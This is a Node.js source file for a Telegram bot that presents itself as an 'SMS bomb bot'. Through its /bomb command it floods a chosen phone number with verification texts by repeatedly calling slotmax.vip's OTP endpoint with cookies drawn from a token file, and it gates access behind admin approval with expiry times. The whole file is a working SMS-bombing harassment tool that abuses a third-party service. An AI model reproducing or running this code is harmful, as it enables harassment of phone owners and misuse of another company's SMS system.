require('dotenv').config();
const express = require('express');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const axios = require('axios');
const { MongoClient } = require('mongodb');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const botToken = process.env.BOT_TOKEN;
const mongoUri = process.env.MONGO_URI;
const bot = new TelegramBot(botToken, { polling: true });

const file = JSON.parse(fs.readFileSync("eytokens.json", "utf-8"));

const headers = {
  'User-Agent': 'Mozilla/5.0',
  'Accept': 'application/json, text/plain, */*',
  'Content-Type': 'application/json',
  'origin': 'https://slotmax.vip',
  'referer': 'https://slotmax.vip/wallet',
};

const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
const numberspamed = {};

const client = new MongoClient(mongoUri, { useNewUrlParser: true, useUnifiedTopology: true });
const dbName = 'SMSBOTUSERS';
const usersCollection = 'DBUSERS';
const ADMIN_CHAT_ID = 7810011711;

async function connectDB() {
  await client.connect();
}
connectDB();

async function smsotp(phone) {
  try {
    const cookie = file[Math.floor(Math.random() * file.length)];
    await axios.post('https://slotmax.vip/api/user/sms/send/bind', {
      phone,
      areaCode: "63"
    }, { headers: { ...headers, cookie } });
  } catch (error) {}
}

async function approveUser(userId, expirationDate) {
  const db = client.db(dbName);
  const collection = db.collection(usersCollection);
  await collection.updateOne(
    { user_id: userId },
    { $set: { user_id: userId, expiration_date: expirationDate } },
    { upsert: true }
  );
}

async function checkExpiredUsers() {
  const db = client.db(dbName);
  const collection = db.collection(usersCollection);
  const users = await collection.find().toArray();
  users.forEach(user => {
    if (Date.now() > user.expiration_date) {
      bot.sendMessage(user.user_id, "❌ Your access has expired. Please request access again.");
      collection.deleteOne({ user_id: user.user_id });
    }
  });
}
setInterval(checkExpiredUsers, 60 * 1000);

bot.onText(/\/start/, async msg => {
  const userId = msg.from.id;
  const username = msg.from.username || "NoUsername";

  await bot.sendPhoto(userId, 'https://i.ibb.co/XbQdHdL/KOREKONG.png', {
    caption: `👋 𝗛𝗘𝗬 𝗧𝗛𝗘𝗥𝗘 @${username}, 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗧𝗛𝗘 𝗧𝗢𝗦𝗛𝗜 𝗦𝗠𝗦 𝗕𝗢𝗠𝗕 𝗕𝗢𝗧! \n\n💣 𝗬𝗢𝗨’𝗥𝗘 𝗔𝗕𝗢𝗨𝗧 𝗧𝗢 𝗧𝗔𝗣 𝗜𝗡𝗧𝗢 𝗦𝗢𝗠𝗘𝗧𝗛𝗜𝗡𝗚 𝗣𝗢𝗪𝗘𝗥𝗙𝗨𝗟.  \n\n𝗧𝗛𝗜𝗦 𝗕𝗢𝗧 𝗖𝗔𝗡 𝗦𝗘𝗡𝗗 𝗠𝗔𝗦𝗦𝗜𝗩𝗘 𝗦𝗠𝗦 𝗪𝗔𝗩𝗘𝗦 𝗜𝗡 𝗦𝗘𝗖𝗢𝗡𝗗𝗦\n\n — 𝗕𝗨𝗧 𝗥𝗘𝗠𝗘𝗠𝗕𝗘𝗥, 𝗪𝗜𝗧𝗛 𝗚𝗥𝗘𝗔𝗧 𝗣𝗢𝗪𝗘𝗥 𝗖𝗢𝗠𝗘𝗦... 𝗪𝗘𝗟𝗟, 𝗬𝗢𝗨 𝗞𝗡𝗢𝗪 𝗧𝗛𝗘 𝗥𝗘𝗦𝗧. 😎 \n\n 👤 𝗜𝗙 𝗬𝗢𝗨’𝗥𝗘 𝗡𝗘𝗪 𝗛𝗘𝗥𝗘, \n\n\n𝗨𝗦𝗘 /𝗿𝗲𝗾𝘂𝗲𝘀𝘁 𝗧𝗢 𝗔𝗣𝗣𝗟𝗬 𝗙𝗢𝗥 𝗔𝗖𝗖𝗘𝗦𝗦.\n\n🛡️ 𝗪𝗘 𝗗𝗢𝗡’𝗧 𝗟𝗘𝗧 𝗝𝗨𝗦𝗧 𝗔𝗡𝗬𝗢𝗡𝗘 𝗜𝗡\n\n — 𝗣𝗥𝗢𝗩𝗘 𝗬𝗢𝗨’𝗥𝗘 𝗪𝗢𝗥𝗧𝗛𝗬.  \n\n𝗥𝗘𝗔𝗗𝗬 𝗧𝗢 𝗚𝗘𝗧 𝗦𝗧𝗔𝗥𝗧𝗘𝗗? 𝗟𝗘𝗧’𝗦 𝗥𝗢𝗟𝗟. 🚀`
  });
});

bot.onText(/\/request/, async msg => {
  const userId = msg.from.id;
  const username = msg.from.username || "NoUsername";
  const db = client.db(dbName);
  const collection = db.collection(usersCollection);
  const user = await collection.findOne({ user_id: userId });

  if (user && Date.now() < user.expiration_date) {
    return bot.sendMessage(userId, "✅ You're already approved. You can use /bomb now.");
  }

  await bot.sendPhoto(userId, 'https://i.ibb.co/RG8SQQjC/BASRA.png', {
    caption: "📨 𝗥𝗘𝗤𝗨𝗘𝗦𝗧 𝗛𝗔𝗦 𝗕𝗘𝗘𝗡 𝗦𝗘𝗡𝗗𝗘𝗗 𝗧𝗢 𝗧𝗛𝗘 𝗔𝗗𝗠𝗜𝗡, 𝗣𝗟𝗘𝗔𝗦𝗘 𝗪𝗔𝗜𝗧 𝗙𝗢𝗥 𝗧𝗛𝗘 𝗔𝗣𝗣𝗥𝗢𝗩𝗔𝗟"
  });

  await bot.sendMessage(ADMIN_CHAT_ID, `📥 *𝗡𝗘𝗪 𝗨𝗦𝗘𝗥 𝗔𝗖𝗖𝗘𝗦𝗦*\n\n👤 @${username}\n🆔 ID: ${userId}`, {
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Approve", callback_data: `approve_${userId}` },
          { text: "❌ Decline", callback_data: `decline_${userId}` }
        ]
      ]
    }
  });
});

bot.onText(/\/help/, async msg => {
  const userId = msg.from.id;

  const helpText = `📖 *𝗛𝗢𝗪 𝗧𝗢 𝗨𝗦𝗘 𝗧𝗛𝗘 𝗕𝗢𝗧*\n\n` +
    `🔹 /start – Welcome message and intro\n` +
    `🔹 /request – Ask for access (approval needed)\n` +
    `🔹 /bomb <number> <seconds> – Start SMS bombing\n\n` +
    `📌 *𝗘𝗫𝗔𝗠𝗣𝗟𝗘:* \`/bomb 09123456789 60\`\n` +
    `This will attack 09123456789 for 60 seconds\n\n` +
    `⚠️ Max duration: 240s\n` +
    `⚠️ Only one bomb per number at a time\n\n` +
    `If your access expires, just use /request again to reapply.`;

  await bot.sendMessage(userId, helpText, { parse_mode: 'Markdown' });
});

bot.on('callback_query', async query => {
  const { data, message } = query;
  const [action, userIdStr] = data.split("_");
  const userId = parseInt(userIdStr);
  const db = client.db(dbName);
  const collection = db.collection(usersCollection);

  if (action === "approve") {
    await bot.sendMessage(query.from.id, `⏳ Send access time: *Days Hours Minutes*`);
    bot.once('message', async (response) => {
      const [days, hours, minutes] = response.text.split(" ").map(Number);
      const expirationDate = Date.now() + ((days * 24 + hours) * 60 + minutes) * 60 * 1000;
      await approveUser(userId, expirationDate);
      bot.sendMessage(userId, `🎉 𝗔𝗖𝗖𝗘𝗦𝗦 𝗔𝗣𝗣𝗥𝗢𝗩𝗘 𝗙𝗢𝗥 ${days}d ${hours}h ${minutes}m. Use /bomb`);
      bot.sendMessage(query.from.id, `✅ Access set for ${userIdStr}`);
      bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
        chat_id: message.chat.id,
        message_id: message.message_id
      });
    });
  } else if (action === "decline") {
    bot.sendMessage(userId, "❌ Your access request was declined.");
    bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
      chat_id: message.chat.id,
      message_id: message.message_id
    });
  }
});

bot.onText(/\/bomb (\d{10,12}) (\d{1,3})/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const db = client.db(dbName);
  const collection = db.collection(usersCollection);
  const user = await collection.findOne({ user_id: userId });

  if (!user || Date.now() > user.expiration_date) {
    return bot.sendMessage(chatId, "❌ Access expired or not approved.");
  }

  const number = match[1];
  const seconds = parseInt(match[2]);

  if (seconds > 240 || numberspamed[number]) {
    return bot.sendMessage(chatId, "⚠️ Invalid duration or already active.");
  }

  numberspamed[number] = true;
  bot.sendMessage(chatId, `💥 𝗔𝗧𝗧𝗔𝗖𝗞𝗜𝗡𝗚  ${number} 𝗙𝗢𝗥 ${seconds}s`);
  delay(seconds * 1000).then(() => {
    numberspamed[number] = false;
    bot.sendMessage(chatId, `✅ Done bombing ${number}`);
  });

  while (numberspamed[number]) {
    await smsotp(number.slice(1));
    await delay(3000);
  }
});

app.get('/api/users', async (req, res) => {
  const db = client.db(dbName);
  const collection = db.collection(usersCollection);
  const users = await collection.find().toArray();
  res.json(users);
});

app.post('/api/delete-access', async (req, res) => {
  const { user_id } = req.body;
  const db = client.db(dbName);
  const collection = db.collection(usersCollection);
  const user = await collection.findOne({ user_id: parseInt(user_id) });

  if (!user) return res.status(404).json({ success: false, message: "User not found" });
  await collection.deleteOne({ user_id: parseInt(user_id) });

  try {
    await bot.sendMessage(parseInt(user_id), "🚫 𝗬𝗢𝗨𝗥 𝗔𝗖𝗖𝗘𝗦𝗦 𝗛𝗔𝗦 𝗕𝗘𝗘𝗡 𝗥𝗘𝗩𝗢𝗞𝗘𝗗 𝗕𝗬 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥.");
  } catch (e) {}

  return res.json({ success: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
